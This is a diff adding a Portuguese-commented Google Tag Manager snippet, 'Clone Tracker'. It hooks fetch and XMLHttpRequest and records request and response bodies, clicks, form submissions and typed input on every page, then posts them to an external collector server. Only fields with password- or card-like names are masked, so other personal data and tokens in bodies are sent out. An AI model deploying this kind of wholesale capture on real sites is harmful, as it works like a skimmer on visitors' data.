@@ -1,0 +1,401 @@
+<!--
+  SCRIPT COMPATÍVEL COM GTM (ES5)
+
+  INSTRUÇÕES:
+  1. Copie TODO este código
+  2. No Google Tag Manager: Tags > Nova > HTML Personalizado
+  3. Cole este código completo
+  4. Acionador: All Pages
+  5. Salvar e Publicar
+-->
+
+<script>
+(function() {
+    'use strict';
+
+    // URL do seu servidor Laravel
+    var COLLECTOR_URL = 'https://cc-sorteador.on-forge.com/api/collect';
+
+    // URLs/domínios para ignorar (não capturar)
+    var IGNORED_DOMAINS = [
+        'clarity.ms',
+        'clarity.microsoft.com',
+        'c.clarity.ms',
+        'www.clarity.ms',
+        'google-analytics.com',
+        'googletagmanager.com',
+        'doubleclick.net',
+        'facebook.com/tr',
+        'analytics.tiktok.com'
+    ];
+
+    // Verifica se uma URL deve ser ignorada
+    function shouldIgnoreUrl(url) {
+        if (!url) return false;
+        var urlLower = url.toLowerCase();
+        for (var i = 0; i < IGNORED_DOMAINS.length; i++) {
+            if (urlLower.indexOf(IGNORED_DOMAINS[i]) > -1) {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    // Gera ou recupera session ID
+    function getSessionId() {
+        var sessionId = sessionStorage.getItem('clone_tracker_session');
+        if (!sessionId) {
+            sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            sessionStorage.setItem('clone_tracker_session', sessionId);
+        }
+
+        // GARANTIR que nunca seja null/undefined/vazio
+        if (!sessionId || sessionId === 'null' || sessionId === 'undefined') {
+            sessionId = 'session_fallback_' + Date.now();
+            sessionStorage.setItem('clone_tracker_session', sessionId);
+        }
+
+        return sessionId;
+    }
+
+    // Captura informações do navegador
+    function getBrowserInfo() {
+        var sessionId = getSessionId();
+
+        return {
+            sessionId: sessionId,
+            domain: window.location.hostname || 'unknown',
+            url: window.location.href || '',
+            referrer: document.referrer || '',
+            screenResolution: (screen.width || 0) + 'x' + (screen.height || 0),
+            language: navigator.language || navigator.userLanguage || 'unknown',
+            timestamp: new Date().toISOString(),
+            requests: []
+        };
+    }
+
+    // Armazena as requisições capturadas
+    var capturedRequests = [];
+
+    // Guarda o fetch original
+    var originalFetch = window.fetch;
+
+    // Intercepta Fetch API
+    if (originalFetch) {
+        window.fetch = function() {
+            var args = Array.prototype.slice.call(arguments);
+            var url = typeof args[0] === 'string' ? args[0] : (args[0] && args[0].url) || '';
+            var options = args[1] || {};
+            var method = options.method || 'GET';
+
+            // Não interceptar chamadas para o próprio collector
+            if (url.indexOf('/api/collect') > -1) {
+                return originalFetch.apply(this, args);
+            }
+
+            // Ignorar URLs de analytics/tracking (Clarity, GA, etc)
+            if (shouldIgnoreUrl(url)) {
+                return originalFetch.apply(this, args);
+            }
+
+            var requestData = {
+                type: 'fetch',
+                url: url,
+                method: method,
+                timestamp: new Date().toISOString()
+            };
+
+            if (options.body) {
+                try {
+                    requestData.body = options.body;
+                } catch (e) {
+                    requestData.body = '[Unable to capture]';
+                }
+            }
+
+            capturedRequests.push(requestData);
+
+            // Executa o fetch original e captura a resposta
+            return originalFetch.apply(this, args).then(function(response) {
+                var responseData = {
+                    type: 'fetch_response',
+                    url: url,
+                    status: response.status,
+                    statusText: response.statusText,
+                    timestamp: new Date().toISOString()
+                };
+
+                // Tenta capturar o corpo da resposta
+                var clonedResponse = response.clone();
+                clonedResponse.text().then(function(body) {
+                    try {
+                        responseData.body = JSON.parse(body);
+                    } catch (e) {
+                        responseData.bodyPreview = body.substring(0, 500);
+                    }
+                    capturedRequests.push(responseData);
+                }).catch(function() {});
+
+                return response;
+            });
+        };
+    }
+
+    // Intercepta XMLHttpRequest
+    var originalXHROpen = XMLHttpRequest.prototype.open;
+    var originalXHRSend = XMLHttpRequest.prototype.send;
+
+    XMLHttpRequest.prototype.open = function(method, url) {
+        // Ignorar URLs de analytics/tracking
+        if (shouldIgnoreUrl(url)) {
+            this._ignored = true;
+            return originalXHROpen.apply(this, arguments);
+        }
+
+        this._requestData = {
+            type: 'xhr',
+            method: method,
+            url: url,
+            timestamp: new Date().toISOString()
+        };
+        return originalXHROpen.apply(this, arguments);
+    };
+
+    XMLHttpRequest.prototype.send = function(body) {
+        var self = this;
+
+        // Se foi marcado como ignorado, não capturar
+        if (this._ignored) {
+            return originalXHRSend.apply(this, arguments);
+        }
+
+        if (this._requestData) {
+            if (body) {
+                try {
+                    this._requestData.body = body;
+                } catch (e) {
+                    this._requestData.body = '[Unable to capture]';
+                }
+            }
+
+            capturedRequests.push(this._requestData);
+
+            // Captura a resposta
+            this.addEventListener('load', function() {
+                var responseData = {
+                    type: 'xhr_response',
+                    url: self._requestData.url,
+                    status: self.status,
+                    statusText: self.statusText,
+                    timestamp: new Date().toISOString()
+                };
+
+                try {
+                    responseData.body = JSON.parse(self.responseText);
+                } catch (e) {
+                    responseData.bodyPreview = self.responseText.substring(0, 500);
+                }
+
+                capturedRequests.push(responseData);
+            });
+        }
+
+        return originalXHRSend.apply(this, arguments);
+    };
+
+    // Captura cliques em elementos
+    document.addEventListener('click', function(e) {
+        var element = e.target;
+        if (!element) return;
+
+        var clickData = {
+            type: 'click',
+            tagName: element.tagName || '',
+            id: element.id || '',
+            className: element.className || '',
+            text: element.innerText ? element.innerText.substring(0, 100) : '',
+            href: element.href || '',
+            timestamp: new Date().toISOString()
+        };
+
+        capturedRequests.push(clickData);
+    }, true);
+
+    // Captura submissão de formulários
+    document.addEventListener('submit', function(e) {
+        var form = e.target;
+        var formData = new FormData(form);
+        var formFields = {};
+
+        // Captura campos do formulário (mascarando senhas)
+        var entries = [];
+
+        // Fallback para navegadores antigos
+        if (formData.entries) {
+            var iterator = formData.entries();
+            var entry = iterator.next();
+            while (!entry.done) {
+                entries.push(entry.value);
+                entry = iterator.next();
+            }
+        }
+
+        for (var i = 0; i < entries.length; i++) {
+            var key = entries[i][0];
+            var value = entries[i][1];
+
+            var keyLower = key.toLowerCase();
+            if (keyLower.indexOf('password') > -1 ||
+                keyLower.indexOf('senha') > -1 ||
+                keyLower.indexOf('cvv') > -1 ||
+                keyLower.indexOf('card') > -1) {
+                formFields[key] = '[MASKED]';
+            } else {
+                formFields[key] = value;
+            }
+        }
+
+        var submitData = {
+            type: 'form_submit',
+            action: form.action,
+            method: form.method,
+            fields: formFields,
+            timestamp: new Date().toISOString()
+        };
+
+        capturedRequests.push(submitData);
+    }, true);
+
+    // Captura mudanças de input
+    var inputDebounce = {};
+    document.addEventListener('input', function(e) {
+        var input = e.target;
+        if (input.tagName === 'INPUT' || input.tagName === 'TEXTAREA') {
+            var fieldName = input.name || input.id || 'unknown';
+
+            // Debounce para não capturar cada tecla
+            clearTimeout(inputDebounce[fieldName]);
+            inputDebounce[fieldName] = setTimeout(function() {
+                var value = input.value;
+                var fieldNameLower = fieldName.toLowerCase();
+
+                // Mascara campos sensíveis
+                if (input.type === 'password' ||
+                    fieldNameLower.indexOf('password') > -1 ||
+                    fieldNameLower.indexOf('senha') > -1 ||
+                    fieldNameLower.indexOf('cvv') > -1 ||
+                    fieldNameLower.indexOf('card') > -1) {
+                    value = '[MASKED]';
+                }
+
+                var inputData = {
+                    type: 'input_change',
+                    fieldName: fieldName,
+                    fieldType: input.type,
+                    value: value,
+                    timestamp: new Date().toISOString()
+                };
+
+                capturedRequests.push(inputData);
+            }, 500);
+        }
+    }, true);
+
+    // Envia os dados para o servidor
+    function sendToServer() {
+        if (capturedRequests.length === 0) {
+            return;
+        }
+
+        var data = getBrowserInfo();
+
+        // Copia o array de requests
+        data.requests = [];
+        for (var i = 0; i < capturedRequests.length; i++) {
+            data.requests.push(capturedRequests[i]);
+        }
+
+        // VALIDAÇÃO CRÍTICA: Garantir que sessionId existe
+        if (!data.sessionId) {
+            console.error('[Clone Tracker] ERRO: sessionId vazio!');
+            data.sessionId = 'session_error_' + Date.now();
+        }
+
+        console.log('[Clone Tracker] Enviando:', data.sessionId);
+
+        // Limpa o array de requisições capturadas
+        capturedRequests = [];
+
+        // Envia via fetch original (não interceptado)
+        if (originalFetch) {
+            originalFetch(COLLECTOR_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data),
+                mode: 'cors'
+            })
+            .then(function(response) {
+                console.log('[Clone Tracker] Status:', response.status);
+                return response.json();
+            })
+            .then(function(result) {
+                console.log('[Clone Tracker] Sucesso:', result);
+            })
+            .catch(function(error) {
+                console.error('[Clone Tracker] Erro:', error);
+            });
+        } else {
+            // Fallback para XMLHttpRequest
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', COLLECTOR_URL, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.onload = function() {
+                if (xhr.status === 201) {
+                    console.log('[Clone Tracker] Sucesso');
+                }
+            };
+            xhr.onerror = function() {
+                console.error('[Clone Tracker] Erro no envio');
+            };
+            xhr.send(JSON.stringify(data));
+        }
+    }
+
+    // Envia dados a cada 10 segundos
+    setInterval(sendToServer, 10000);
+
+    // Envia dados quando a página é fechada
+    window.addEventListener('beforeunload', function() {
+        if (capturedRequests.length > 0) {
+            var data = getBrowserInfo();
+
+            // Copia requests
+            data.requests = [];
+            for (var i = 0; i < capturedRequests.length; i++) {
+                data.requests.push(capturedRequests[i]);
+            }
+
+            // Usa sendBeacon para garantir que os dados sejam enviados
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon(COLLECTOR_URL, JSON.stringify(data));
+            } else {
+                sendToServer();
+            }
+        }
+    });
+
+    // Envia dados iniciais ao carregar a página
+    capturedRequests.push({
+        type: 'page_load',
+        url: window.location.href,
+        timestamp: new Date().toISOString()
+    });
+
+    // Envia após 2 segundos do carregamento
+    setTimeout(sendToServer, 2000);
+
+    console.log('[Clone Tracker] Initialized - Session:', getSessionId());
+})();
+</script>
